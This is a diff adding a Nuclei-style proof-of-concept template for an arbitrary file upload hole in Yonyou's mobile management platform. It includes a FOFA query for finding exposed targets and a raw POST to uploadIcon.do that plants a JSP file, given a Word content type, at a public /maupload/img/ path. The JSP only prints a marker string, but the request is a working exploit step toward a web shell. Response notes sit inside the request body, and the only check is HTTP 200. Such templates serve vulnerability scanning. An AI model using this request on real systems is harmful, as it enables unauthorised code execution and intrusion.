@@ -1,0 +1,77 @@
+id: poc-shz1loqcgwo2sit8
+info:
+  name: 用友移动管理平台uploadIcon任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/shz1loqcgwo2sit8'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: shz1loqcgwo2sit8
+    fofa: app="用友-移动系统管理"
+http:
+- raw:
+  - 'POST /maportal/appmanager/uploadIcon.do HTTP/1.1
+
+
+    Cache-Control: no-cache
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+
+
+    Origin: chrome-extension://coohjcphdfgbiolnekdpbcijmhambjff
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: JSESSIONID=96C92E0C800D0F301877F24A281C4630.server
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+
+
+    Content-Disposition: form-data; name="iconFile"; filename="dudesuite.jsp"
+
+
+    Content-Type: application/msword
+
+
+
+
+    <% out.print("dudesuite"); %>
+
+
+    ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    status
+
+
+    # 上传文件定位
+
+    /maupload/img/dudesuite.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
